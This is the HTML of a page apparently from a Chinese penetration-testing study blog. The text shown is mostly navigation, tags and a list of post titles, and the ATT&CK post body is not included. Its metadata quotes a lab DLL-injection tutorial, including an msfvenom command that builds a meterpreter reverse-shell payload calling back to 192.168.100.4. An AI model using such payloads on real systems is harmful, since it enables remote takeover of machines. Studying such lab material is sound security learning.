<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>ATT-CK学习 | 10fteam</title>
  <meta name="keywords" content=" 知识 , backdoor ">
  <meta name="description" content="ATT-CK学习 | 10fteam">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="description" content="0x00 DLL注入 所谓DLL注入就是将一个DLL放进某个进程的地址空间里，让它成为那个进程的一部分。要实现DLL注入，首先需要打开目标进程。 环境：kali 靶场：windows server 2008 x64  0x01 生成DLL文件 msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.100.4 lport&#x3D;4444">
<meta name="keywords" content="提权,windows,DLL">
<meta property="og:type" content="article">
<meta property="og:title" content="提权之windows-DLL注入">
<meta property="og:url" content="https:&#x2F;&#x2F;10fteam.github.io&#x2F;%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5&#x2F;index.html">
<meta property="og:site_name" content="10fteam">
<meta property="og:description" content="0x00 DLL注入 所谓DLL注入就是将一个DLL放进某个进程的地址空间里，让它成为那个进程的一部分。要实现DLL注入，首先需要打开目标进程。 环境：kali 靶场：windows server 2008 x64  0x01 生成DLL文件 msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.100.4 lport&#x3D;4444">
<meta property="og:locale" content="default">
<meta property="og:image" content="https:&#x2F;&#x2F;10fteam.github.io&#x2F;%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5&#x2F;1.png">
<meta property="og:image" content="https:&#x2F;&#x2F;10fteam.github.io&#x2F;%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5&#x2F;2.png">
<meta property="og:image" content="https:&#x2F;&#x2F;10fteam.github.io&#x2F;%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5&#x2F;3.png">
<meta property="og:image" content="https:&#x2F;&#x2F;10fteam.github.io&#x2F;%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5&#x2F;4.png">
<meta property="og:image" content="https:&#x2F;&#x2F;10fteam.github.io&#x2F;%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5&#x2F;5.png">
<meta property="og:image" content="https:&#x2F;&#x2F;10fteam.github.io&#x2F;%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5&#x2F;6.png">
<meta property="og:image" content="https:&#x2F;&#x2F;10fteam.github.io&#x2F;%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5&#x2F;7.png">
<meta property="og:image" content="https:&#x2F;&#x2F;10fteam.github.io&#x2F;%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5&#x2F;8.png">
<meta property="og:image" content="https:&#x2F;&#x2F;10fteam.github.io&#x2F;%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5&#x2F;9.png">
<meta property="og:image" content="https:&#x2F;&#x2F;10fteam.github.io&#x2F;%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5&#x2F;13.png">
<meta property="og:image" content="https:&#x2F;&#x2F;10fteam.github.io&#x2F;%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5&#x2F;14.png">
<meta property="og:image" content="https:&#x2F;&#x2F;10fteam.github.io&#x2F;%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5&#x2F;15.png">
<meta property="og:image" content="https:&#x2F;&#x2F;10fteam.github.io&#x2F;%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5&#x2F;16.png">
<meta property="og:image" content="https:&#x2F;&#x2F;10fteam.github.io&#x2F;%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5&#x2F;12.png">
<meta property="og:image" content="https:&#x2F;&#x2F;10fteam.github.io&#x2F;%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5&#x2F;11.png">
<meta property="og:updated_time" content="2020-03-25T15:56:49.676Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https:&#x2F;&#x2F;10fteam.github.io&#x2F;%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5&#x2F;1.png">


<link rel="icon" href="/img/avatar.jpg">

<link href="/css/style.css?v=1.0.1" rel="stylesheet">

<link href="/css/hl_theme/atom-light.css?v=1.0.1" rel="stylesheet">

<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="/js/jquery.autocomplete.min.js?v=1.0.1" ></script>

<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
<script>
    hljs.initHighlightingOnLoad();
</script>

<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>



<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js" ></script>

<script src="/js/iconfont.js?v=1.0.1" ></script>

</head>
<div style="display: none">
  <input class="theme_disqus_on" value="false">
  <input class="theme_preload_comment" value="false">
  <input class="theme_blog_path" value="">
</div>

<body>
<aside class="nav">
    <div class="nav-left">
        <a href="/" class="avatar_target">
    <img class="avatar" src="/img/avatar.jpg" />
</a>
<div class="author">
    <span>10fteam</span>
</div>

<div class="icon">
    
</div>




<ul>
    <li><div class="all active">全部文章<small>(73)</small></div></li>
    
</ul>
<div class="left-bottom">
    <div class="menus">
    
    
    
    
    
    
    
    
    
    
    
    </div>
    <div><a  class="friends">传送门</a></div>
</div>
<input type="hidden" id="yelog_site_posts_number" value="73">

<div style="display: none">
    <span id="busuanzi_value_site_uv"></span>
    <span id="busuanzi_value_site_pv"></span>
</div>

    </div>
    <div class="nav-right">
        <div class="friends-area">
    <div class="friends-title">
        安全链接
        <i class="back-title-list"></i>
    </div>
    <div class="friends-content">
        <ul>
            
            <li><a target="_blank" href="https://www.baidu.com/">百度一下</a></li>
            
            <li><a target="_blank" href="https://github.com/">GitHub</a></li>
            
            <li><a target="_blank" href="https://www.freebuf.com/">freebuf</a></li>
            
            <li><a target="_blank" href="https://www.anquanke.com/">安全客</a></li>
            
            <li><a target="_blank" href="https://xz.aliyun.com/">先知社区</a></li>
            
            <li><a target="_blank" href="https://www.pediy.com/">看雪</a></li>
            
            <li><a target="_blank" href="https://www.52pojie.cn/">吾爱破解</a></li>
            
            <li><a target="_blank" href="https://bbs.ichunqiu.com/portal.php">I春秋</a></li>
            
            <li><a target="_blank" href="https://ipcmen.com/">Linux命令</a></li>
            
            <li><a target="_blank" href="https://start.me/p/X20Apn">安全导航1</a></li>
            
            <li><a target="_blank" href="https://www.shentoushi.top/">安全导航2</a></li>
            
        </ul>
    </div>
</div>
        <div class="title-list">
    <form onkeydown="if(event.keyCode==13){return false;}">
        <input class="search" type="text" placeholder="以 in: 开头进行全文搜索" autocomplete="off"id="local-search-input" >
        <i class="cross"></i>
        <span>
            <label for="tagswitch">Tags:</label>
            <input id="tagswitch" type="checkbox" style="display: none" />
            <i id="tagsWitchIcon"></i>
        </span>
    </form>
    <div class="tags-list">
    
    <li class="article-tag-list-item">
        <a class="color4">CTF</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color1">encrypt_decrypt</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">知识</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">backdoor</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">misc</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">工具</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">漏洞</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">HTB</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">靶机</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">writeup</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color1">Linux</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">信息搜集</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">安全加固</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">入侵检测</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">应急响应</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">PHP</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">代码审计</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">POC</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">EXP</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">PWN</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color2">python</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">注入</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color1">phpmyadmin</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">Struts2</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">weblogic</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">脱壳</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">app</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">encode_decode</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color1">shell</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">靶场</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">vulnhub</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">僵尸网络</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">内网渗透</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color1">share</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">CDN</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">提权</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">书籍</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color1">linux</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">windows</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">DLL</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">WAF</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">MISC</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">逆向</a>
    </li>
    
    <div class="clearfix"></div>
</div>

    
    <div id="local-search-result">

    </div>
    
    <nav id="title-list-nav">
        
        <a  class=""
           href="/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E4%B9%8B%E6%81%B6%E8%87%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/"
           data-tag="CTF,encrypt_decrypt"
           data-author="" >
            <span class="post-title" title="2019红帽杯之恶臭的数据包">2019红帽杯之恶臭的数据包</span>
            <span class="post-date" title="2019-12-04 21:47:23">2019/12/04</span>
        </a>
        
        <a  class=""
           href="/ATT-CK%E5%AD%A6%E4%B9%A0/"
           data-tag="知识,backdoor"
           data-author="" >
            <span class="post-title" title="ATT-CK学习">ATT-CK学习</span>
            <span class="post-date" title="2020-01-13 10:26:28">2020/01/13</span>
        </a>
        
        <a  class=""
           href="/CTF-RSA/"
           data-tag="CTF,encrypt_decrypt"
           data-author="" >
            <span class="post-title" title="CTF-RSA">CTF-RSA</span>
            <span class="post-date" title="2019-11-30 20:07:30">2019/11/30</span>
        </a>
        
        <a  class=""
           href="/CTF%E4%B8%8Ewireshark/"
           data-tag="CTF,知识"
           data-author="" >
            <span class="post-title" title="CTF与wireshark">CTF与wireshark</span>
            <span class="post-date" title="2020-01-01 21:28:37">2020/01/01</span>
        </a>
        
        <a  class=""
           href="/CTF%E4%B9%8B%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"
           data-tag="CTF,知识"
           data-author="" >
            <span class="post-title" title="CTF之文件格式">CTF之文件格式</span>
            <span class="post-date" title="2020-01-12 15:25:18">2020/01/12</span>
        </a>
        
        <a  class=""
           href="/CTF%E4%B9%8B%E9%9A%90%E5%86%99%E6%9C%AF/"
           data-tag="CTF,misc"
           data-author="" >
            <span class="post-title" title="CTF之隐写术">CTF之隐写术</span>
            <span class="post-date" title="2020-02-07 20:54:52">2020/02/07</span>
        </a>
        
        <a  class=""
           href="/CobaltStrike/"
           data-tag="知识,工具"
           data-author="" >
            <span class="post-title" title="CobaltStrike">CobaltStrike</span>
            <span class="post-date" title="2020-01-04 19:01:40">2020/01/04</span>
        </a>
        
        <a  class=""
           href="/DNS%E8%AE%B0%E5%BD%95/"
           data-tag="知识"
           data-author="" >
            <span class="post-title" title="DNS记录">DNS记录</span>
            <span class="post-date" title="2019-12-06 22:37:01">2019/12/06</span>
        </a>
        
        <a  class=""
           href="/File-Upload/"
           data-tag="漏洞"
           data-author="" >
            <span class="post-title" title="File-Upload">File-Upload</span>
            <span class="post-date" title="2020-01-06 18:23:35">2020/01/06</span>
        </a>
        
        <a  class=""
           href="/HTB-Wall/"
           data-tag="HTB,靶机,writeup"
           data-author="" >
            <span class="post-title" title="HTB-Wall">HTB-Wall</span>
            <span class="post-date" title="2019-12-17 22:06:37">2019/12/17</span>
        </a>
        
        <a  class=""
           href="/JSON%E5%8A%AB%E6%8C%81%E6%94%BB%E5%87%BB/"
           data-tag="漏洞"
           data-author="" >
            <span class="post-title" title="JSON劫持攻击">JSON劫持攻击</span>
            <span class="post-date" title="2020-02-02 21:08:10">2020/02/02</span>
        </a>
        
        <a  class=""
           href="/John-the-Ripper/"
           data-tag="工具"
           data-author="" >
            <span class="post-title" title="John-the-Ripper">John-the-Ripper</span>
            <span class="post-date" title="2020-01-22 20:55:23">2020/01/22</span>
        </a>
        
        <a  class=""
           href="/Linux-so%E6%96%87%E4%BB%B6/"
           data-tag="知识,Linux"
           data-author="" >
            <span class="post-title" title="Linux-.so文件">Linux-.so文件</span>
            <span class="post-date" title="2020-01-06 11:02:40">2020/01/06</span>
        </a>
        
        <a  class=""
           href="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"
           data-tag="Linux,信息搜集,安全加固,入侵检测,应急响应"
           data-author="" >
            <span class="post-title" title="Linux_信息搜集_安全加固_入侵检测_应急响应">Linux_信息搜集_安全加固_入侵检测_应急响应</span>
            <span class="post-date" title="2019-12-03 22:17:19">2019/12/03</span>
        </a>
        
        <a  class=""
           href="/Nmap/"
           data-tag="工具,信息搜集"
           data-author="" >
            <span class="post-title" title="Nmap">Nmap</span>
            <span class="post-date" title="2020-01-19 22:12:03">2020/01/19</span>
        </a>
        
        <a  class=""
           href="/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F/"
           data-tag="知识"
           data-author="" >
            <span class="post-title" title="OGNL表达式">OGNL表达式</span>
            <span class="post-date" title="2019-12-20 15:38:08">2019/12/20</span>
        </a>
        
        <a  class=""
           href="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/"
           data-tag="PHP,代码审计"
           data-author="" >
            <span class="post-title" title="PHP代码审计学习1">PHP代码审计学习1</span>
            <span class="post-date" title="2019-12-12 15:39:42">2019/12/12</span>
        </a>
        
        <a  class=""
           href="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A12/"
           data-tag="PHP,代码审计"
           data-author="" >
            <span class="post-title" title="PHP代码审计学习2">PHP代码审计学习2</span>
            <span class="post-date" title="2020-01-09 18:28:58">2020/01/09</span>
        </a>
        
        <a  class=""
           href="/PHP%E5%AD%A6%E4%B9%A0/"
           data-tag="知识,PHP"
           data-author="" >
            <span class="post-title" title="PHP学习">PHP学习</span>
            <span class="post-date" title="2020-01-01 23:49:08">2020/01/01</span>
        </a>
        
        <a  class=""
           href="/POC&EXP_Write/"
           data-tag="POC,EXP"
           data-author="" >
            <span class="post-title" title="POC&amp;EXP_Write">POC&amp;EXP_Write</span>
            <span class="post-date" title="2019-11-30 00:45:27">2019/11/30</span>
        </a>
        
        <a  class=""
           href="/PWN%E4%B9%8B%E7%A8%8B%E5%BA%8F%E5%B8%B8%E7%94%A8%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"
           data-tag="CTF,PWN"
           data-author="" >
            <span class="post-title" title="PWN之程序常用的保护机制">PWN之程序常用的保护机制</span>
            <span class="post-date" title="2019-12-05 15:59:05">2019/12/05</span>
        </a>
        
        <a  class=""
           href="/PWN%E5%AD%A6%E4%B9%A0/"
           data-tag="CTF,PWN"
           data-author="" >
            <span class="post-title" title="PWN学习">PWN学习</span>
            <span class="post-date" title="2019-12-04 22:13:47">2019/12/04</span>
        </a>
        
        <a  class=""
           href="/Powershell/"
           data-tag="工具"
           data-author="" >
            <span class="post-title" title="Powershell">Powershell</span>
            <span class="post-date" title="2020-01-15 14:42:24">2020/01/15</span>
        </a>
        
        <a  class=""
           href="/Python%E5%9F%BA%E7%A1%80/"
           data-tag="知识,python"
           data-author="" >
            <span class="post-title" title="Python3基础">Python3基础</span>
            <span class="post-date" title="2019-12-23 23:14:43">2019/12/23</span>
        </a>
        
        <a  class=""
           href="/Python-requests/"
           data-tag="python"
           data-author="" >
            <span class="post-title" title="Python_requests模块">Python_requests模块</span>
            <span class="post-date" title="2019-11-29 19:05:39">2019/11/29</span>
        </a>
        
        <a  class=""
           href="/SQL%E6%B3%A8%E5%85%A5/"
           data-tag="注入,phpmyadmin"
           data-author="" >
            <span class="post-title" title="SQL注入">SQL注入</span>
            <span class="post-date" title="2019-12-01 21:45:31">2019/12/01</span>
        </a>
        
        <a  class=""
           href="/SSRF/"
           data-tag="漏洞"
           data-author="" >
            <span class="post-title" title="SSRF">SSRF</span>
            <span class="post-date" title="2020-01-24 11:50:18">2020/01/24</span>
        </a>
        
        <a  class=""
           href="/Struts2%E6%BC%8F%E6%B4%9E%E5%BA%8F%E5%88%97/"
           data-tag="漏洞,Struts2"
           data-author="" >
            <span class="post-title" title="Struts2漏洞序列">Struts2漏洞序列</span>
            <span class="post-date" title="2019-12-20 14:38:43">2019/12/20</span>
        </a>
        
        <a  class=""
           href="/Weblogic%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/"
           data-tag="漏洞,weblogic"
           data-author="" >
            <span class="post-title" title="Weblogic序列漏洞">Weblogic序列漏洞</span>
            <span class="post-date" title="2019-12-25 11:09:00">2019/12/25</span>
        </a>
        
        <a  class=""
           href="/WordPress%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="WordPress安全配置——未完待续">WordPress安全配置——未完待续</span>
            <span class="post-date" title="2019-12-12 15:30:50">2019/12/12</span>
        </a>
        
        <a  class=""
           href="/XSS/"
           data-tag="漏洞"
           data-author="" >
            <span class="post-title" title="XSS">XSS</span>
            <span class="post-date" title="2019-12-18 13:24:05">2019/12/18</span>
        </a>
        
        <a  class=""
           href="/app%E8%84%B1%E5%A3%B3/"
           data-tag="脱壳,app"
           data-author="" >
            <span class="post-title" title="app脱壳">app脱壳</span>
            <span class="post-date" title="2020-01-11 23:15:37">2020/01/11</span>
        </a>
        
        <a  class=""
           href="/backdoors/"
           data-tag="backdoor"
           data-author="" >
            <span class="post-title" title="backdoors">backdoors</span>
            <span class="post-date" title="2019-12-14 18:13:22">2019/12/14</span>
        </a>
        
        <a  class=""
           href="/docker%E4%BD%BF%E7%94%A8/"
           data-tag="知识"
           data-author="" >
            <span class="post-title" title="docker使用">docker使用</span>
            <span class="post-date" title="2019-12-20 15:17:33">2019/12/20</span>
        </a>
        
        <a  class=""
           href="/hashcat/"
           data-tag="工具"
           data-author="" >
            <span class="post-title" title="hashcat">hashcat</span>
            <span class="post-date" title="2019-12-26 11:11:09">2019/12/26</span>
        </a>
        
        <a  class=""
           href="/hexo-help/"
           data-tag="知识"
           data-author="" >
            <span class="post-title" title="hexo_help">hexo_help</span>
            <span class="post-date" title="2019-11-29 16:45:43">2019/11/29</span>
        </a>
        
        <a  class=""
           href="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/"
           data-tag="知识,encode_decode"
           data-author="" >
            <span class="post-title" title="python与编码解码">python与编码解码</span>
            <span class="post-date" title="2020-02-03 11:53:33">2020/02/03</span>
        </a>
        
        <a  class=""
           href="/python%E5%B0%8F%E8%84%9A%E6%9C%AC/"
           data-tag="python"
           data-author="" >
            <span class="post-title" title="python小脚本">python小脚本</span>
            <span class="post-date" title="2020-02-26 10:59:03">2020/02/26</span>
        </a>
        
        <a  class=""
           href="/shell/"
           data-tag="shell"
           data-author="" >
            <span class="post-title" title="shell">shell</span>
            <span class="post-date" title="2020-01-04 16:49:08">2020/01/04</span>
        </a>
        
        <a  class=""
           href="/vulnhub%E4%B9%8B21LTLTR-Scene-1/"
           data-tag="靶场,vulnhub"
           data-author="" >
            <span class="post-title" title="vulnhub之21LTLTR_Scene_1">vulnhub之21LTLTR_Scene_1</span>
            <span class="post-date" title="2019-12-28 21:03:12">2019/12/28</span>
        </a>
        
        <a  class=""
           href="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/"
           data-tag="靶场,vulnhub,僵尸网络"
           data-author="" >
            <span class="post-title" title="vulnhub之Bitbot.VulnVM-disk1">vulnhub之Bitbot.VulnVM-disk1</span>
            <span class="post-date" title="2019-12-30 00:22:42">2019/12/30</span>
        </a>
        
        <a  class=""
           href="/vulnhub%E4%B9%8BBrainpan-III/"
           data-tag="靶场,vulnhub"
           data-author="" >
            <span class="post-title" title="vulnhub之Brainpan_III">vulnhub之Brainpan_III</span>
            <span class="post-date" title="2019-12-30 23:32:53">2019/12/30</span>
        </a>
        
        <a  class=""
           href="/vulnhub%E4%B9%8BHolynix-v1/"
           data-tag="靶场,vulnhub"
           data-author="" >
            <span class="post-title" title="vulnhub之Holynix-v1">vulnhub之Holynix-v1</span>
            <span class="post-date" title="2020-03-20 15:32:27">2020/03/20</span>
        </a>
        
        <a  class=""
           href="/vulnhub%E4%B9%8BLAMPSecurity-CTF4/"
           data-tag="靶场,vulnhub"
           data-author="" >
            <span class="post-title" title="vulnhub之LAMPSecurity-CTF4">vulnhub之LAMPSecurity-CTF4</span>
            <span class="post-date" title="2020-03-16 14:27:30">2020/03/16</span>
        </a>
        
        <a  class=""
           href="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/"
           data-tag="靶场,vulnhub"
           data-author="" >
            <span class="post-title" title="vulnhub之LAMPSecurity-CTF5">vulnhub之LAMPSecurity-CTF5</span>
            <span class="post-date" title="2020-03-16 15:47:07">2020/03/16</span>
        </a>
        
        <a  class=""
           href="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/"
           data-tag="靶场,vulnhub"
           data-author="" >
            <span class="post-title" title="vulnhub之LAMPSecurity-CTF6">vulnhub之LAMPSecurity-CTF6</span>
            <span class="post-date" title="2020-03-17 13:51:54">2020/03/17</span>
        </a>
        
        <a  class=""
           href="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/"
           data-tag="靶场,vulnhub"
           data-author="" >
            <span class="post-title" title="vulnhub之LAMPSecurity-CTF7">vulnhub之LAMPSecurity-CTF7</span>
            <span class="post-date" title="2020-03-18 14:49:09">2020/03/18</span>
        </a>
        
        <a  class=""
           href="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/"
           data-tag="靶场,vulnhub"
           data-author="" >
            <span class="post-title" title="vulnhub之LAMPSecurity-CTF8">vulnhub之LAMPSecurity-CTF8</span>
            <span class="post-date" title="2020-03-18 22:32:59">2020/03/18</span>
        </a>
        
        <a  class=""
           href="/vulnhub%E4%B9%8BOs-hackNos-3/"
           data-tag="靶场,vulnhub"
           data-author="" >
            <span class="post-title" title="vulnhub之Os-hackNos-3">vulnhub之Os-hackNos-3</span>
            <span class="post-date" title="2020-01-02 13:21:15">2020/01/02</span>
        </a>
        
        <a  class=""
           href="/vulnhub%E4%B9%8Bchakravyuh/"
           data-tag="靶场,vulnhub"
           data-author="" >
            <span class="post-title" title="vulnhub之chakravyuh">vulnhub之chakravyuh</span>
            <span class="post-date" title="2020-01-22 12:08:00">2020/01/22</span>
        </a>
        
        <a  class=""
           href="/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%99%BE%E7%A7%91/"
           data-tag="知识"
           data-author="" >
            <span class="post-title" title="信息安全百科">信息安全百科</span>
            <span class="post-date" title="2020-03-20 23:03:55">2020/03/20</span>
        </a>
        
        <a  class=""
           href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/"
           data-tag="内网渗透"
           data-author="" >
            <span class="post-title" title="内网渗透之Empire">内网渗透之Empire</span>
            <span class="post-date" title="2019-12-19 11:42:47">2019/12/19</span>
        </a>
        
        <a  class=""
           href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/"
           data-tag="内网渗透"
           data-author="" >
            <span class="post-title" title="内网渗透之windows">内网渗透之windows</span>
            <span class="post-date" title="2020-02-20 13:44:17">2020/02/20</span>
        </a>
        
        <a  class=""
           href="/%E5%90%84%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/"
           data-tag="漏洞"
           data-author="" >
            <span class="post-title" title="各端口服务漏洞">各端口服务漏洞</span>
            <span class="post-date" title="2019-12-17 20:27:22">2019/12/17</span>
        </a>
        
        <a  class=""
           href="/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"
           data-tag="知识,漏洞"
           data-author="" >
            <span class="post-title" title="同源策略">同源策略</span>
            <span class="post-date" title="2020-02-02 15:18:48">2020/02/02</span>
        </a>
        
        <a  class=""
           href="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/"
           data-tag="share"
           data-author="" >
            <span class="post-title" title="图文并茂">图文并茂</span>
            <span class="post-date" title="2019-12-02 17:18:16">2019/12/02</span>
        </a>
        
        <a  class=""
           href="/%E5%AF%BB%E6%89%BE%E7%BD%91%E7%AB%99%E7%9A%84%E7%9C%9F%E5%AE%9EIP/"
           data-tag="信息搜集,CDN"
           data-author="" >
            <span class="post-title" title="寻找网站的真实IP">寻找网站的真实IP</span>
            <span class="post-date" title="2019-12-03 13:41:27">2019/12/03</span>
        </a>
        
        <a  class=""
           href="/%E6%8F%90%E6%9D%83/"
           data-tag="提权,书籍"
           data-author="" >
            <span class="post-title" title="提权">提权</span>
            <span class="post-date" title="2019-12-01 21:21:55">2019/12/01</span>
        </a>
        
        <a  class=""
           href="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-dirtycow/"
           data-tag="Linux,提权"
           data-author="" >
            <span class="post-title" title="提权之Linux-dirtycow">提权之Linux-dirtycow</span>
            <span class="post-date" title="2019-12-23 20:26:44">2019/12/23</span>
        </a>
        
        <a  class=""
           href="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-%E5%88%A9%E7%94%A8%E9%80%9A%E9%85%8D%E7%AC%A6%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/"
           data-tag="提权"
           data-author="" >
            <span class="post-title" title="提权之Linux-利用通配符本地提权">提权之Linux-利用通配符本地提权</span>
            <span class="post-date" title="2020-02-13 22:04:26">2020/02/13</span>
        </a>
        
        <a  class=""
           href="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/"
           data-tag="提权,linux"
           data-author="" >
            <span class="post-title" title="提权之Linux-环境变量">提权之Linux-环境变量</span>
            <span class="post-date" title="2020-02-09 11:16:30">2020/02/09</span>
        </a>
        
        <a  class=""
           href="/%E6%8F%90%E6%9D%83%E4%B9%8Bsudo-ed/"
           data-tag="Linux,提权"
           data-author="" >
            <span class="post-title" title="提权之Linux sudo-ed">提权之Linux sudo-ed</span>
            <span class="post-date" title="2019-12-14 17:54:23">2019/12/14</span>
        </a>
        
        <a  class=""
           href="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-CVE-2018-8120/"
           data-tag="提权"
           data-author="" >
            <span class="post-title" title="提权之windows-CVE-2018-8120">提权之windows-CVE-2018-8120</span>
            <span class="post-date" title="2020-02-12 12:46:56">2020/02/12</span>
        </a>
        
        <a  class=""
           href="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/"
           data-tag="提权,windows,DLL"
           data-author="" >
            <span class="post-title" title="提权之windows-DLL注入">提权之windows-DLL注入</span>
            <span class="post-date" title="2020-03-23 16:52:18">2020/03/23</span>
        </a>
        
        <a  class=""
           href="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"
           data-tag="漏洞"
           data-author="" >
            <span class="post-title" title="文件解析漏洞">文件解析漏洞</span>
            <span class="post-date" title="2020-01-14 21:35:14">2020/01/14</span>
        </a>
        
        <a  class=""
           href="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"
           data-tag="知识"
           data-author="" >
            <span class="post-title" title="正则表达式">正则表达式</span>
